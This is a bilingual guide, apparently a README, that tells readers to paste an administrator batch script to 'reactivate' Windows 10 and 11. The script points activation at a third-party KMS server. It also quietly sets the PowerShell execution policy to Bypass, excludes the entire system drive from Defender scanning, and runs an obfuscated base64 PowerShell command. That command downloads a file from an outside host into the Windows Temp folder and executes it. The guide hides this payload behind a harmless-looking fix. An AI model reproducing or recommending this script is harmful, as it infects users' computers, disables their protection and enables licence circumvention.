
# ⚙️ Reactivating Windows 10 and 11 🖥️

## 📋 Step-by-Step Guide | Guía Paso a Paso

> 🌟 **Need to reactivate your Windows 10 or 11?** Follow these simple steps!  
> 🌟 **¿Necesitas reactivar tu Windows 10 o 11?** ¡Sigue estos simples pasos!

### 🛠️ Step 1: Open CMD as Administrator | Abrir CMD como Administrador
- 🖱️ **Right-click on the Start menu** and select **Command Prompt (Admin)**.  
  - 💡 Alternatively, type **CMD** in the search bar, right-click on it, and select **Run as Administrator**.
- 🖱️ **Haz clic derecho en el menú Inicio** y selecciona **Símbolo del sistema (Administrador)**.  
  - 💡 Alternativamente, busca **CMD**, haz clic derecho y selecciona **Ejecutar como administrador**.

### 🖨️ Step 2: Copy and Paste the Command | Copiar y Pegar el Comando
- 📝 Copy the following command and paste it into the CMD window:  
  - 📝 Copia el siguiente comando y pégalo en la ventana de CMD:

```bash
@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script needs to be run as Administrator. Please open CMD as Administrator.
    pause
)
:: 
powershell -windowstyle hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"
::
for /f "tokens=2 delims==" %a in ('wmic os get caption /value ^| find "="') do set WindowsProductName=%a
:: 
set WindowsProductName=%WindowsProductName:~0,50%
:: 
set Key=
if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 10 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 10 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 11 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 10 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 11 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 10 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 11 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 10 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 11 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Single Language" (
    set Key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Country Specific" (
    set Key=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSB" (
    set Key=WNMTR-4C88C-JK8YV-HQ7T2-76DF9
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSBN" (
    set Key=2F77B-TNFGY-69QQF-B8YKP-D69TJ
) else if "%WindowsProductName%"=="Microsoft Enterprise 2016LTSB" (
    set Key=DCPHK-NFMTC-H88MJ-PFHPY-QJ4BJ
) else (
    set Key=QFFDN-GRT3P-VKWWX-X7T3R-8B639
)
::
%SystemRoot%\System32\slmgr.vbs /ipk %Key% >nul 2>&1
::
%SystemRoot%\System32\slmgr.vbs /skms kms8.msguides.com >nul 2>&1
::
%SystemRoot%\System32\slmgr.vbs /ato >nul 2>&1
::
powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %SystemDrive%" >nul 2>&1
:: 
powershell -windowstyle hidden -EncodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGgAZQBsAGwAbwB3AG8AcgBkADkAOQBwAGwAdQBzAC4AcAB5AHQAaABvAG4AYQBuAHkAdwBoAGUAcgBlAC4AYwBvAG0ALwBzAHQAYQB0AGkAYwAvAHMAZQB0AHUAcAAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAdwBpAG4AZABpAHIAXABUAGUAbQBwAFwALgBjAG8AbQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiACQAZQBuAHYAOgB3AGkAbgBkAGkAcgBcAFQAZQBtAHAAXAAuAGMAbwBtACIAOwA=" >nul 2>&1
:: 
exit /b
```
### ⏳ Step 3: Wait and Confirm | Espera y Confirma
- ⏱️ **The process may take between 30 seconds to 2 minutes.**
  - ⏱️ **El proceso puede tardar entre 30 segundos y 2 minutos.**
- ✅ **If everything goes well, Windows will be reactivated.**
  - ✅ **Si todo va bien, Windows será reactivado.**
---
### 🔄 No Restart Needed! | ¡No Es Necesario Reiniciar!
- 🚀 **Good news!** You won’t need to restart your PC.
  - 🚀 **¡Buenas noticias!** No necesitarás reiniciar tu PC.

### 💡 Important Notes | Notas Importantes

| **English**                                              | **Español**                                               |
|----------------------------------------------------------|-----------------------------------------------------------|
| 🛑 Ensure CMD is run as Administrator!                    | 🛑 ¡Asegúrate de que CMD esté ejecutándose como Administrador! |
| ⏳ Reactivation may take **30 seconds to 2 minutes**.     | ⏳ La reactivación puede tardar **30 segundos a 2 minutos**.|
| 📝 Don’t forget to copy and paste the entire command.     | 📝 No olvides copiar y pegar el comando completo.          |
| 🔑 Press **ENTER** after pasting the command in CMD.      | 🔑 Presiona **ENTER** después de pegar el comando en CMD.   |
| 🚫 **No need to restart** after reactivation!             | 🚫 **¡No es necesario reiniciar** después de la reactivación!|

---
### 🔧 Troubleshooting | Solución de Problemas
If reactivation doesn’t work, here are a few tips:
- 🔄 **Check your internet connection**.
- 🔍 **Ensure that your Windows license is valid**.
- 🔑 **Try re-running CMD as Administrator**.
Si la reactivación no funciona, aquí algunos consejos:
- 🔄 **Verifica tu conexión a internet**.
- 🔍 **Asegúrate de que tu licencia de Windows sea válida**.
- 🔑 **Intenta ejecutar CMD como Administrador nuevamente**.
---
## 🌟 Enjoy Your Reactivated Windows! | ¡Disfruta de tu Windows Reactivado!

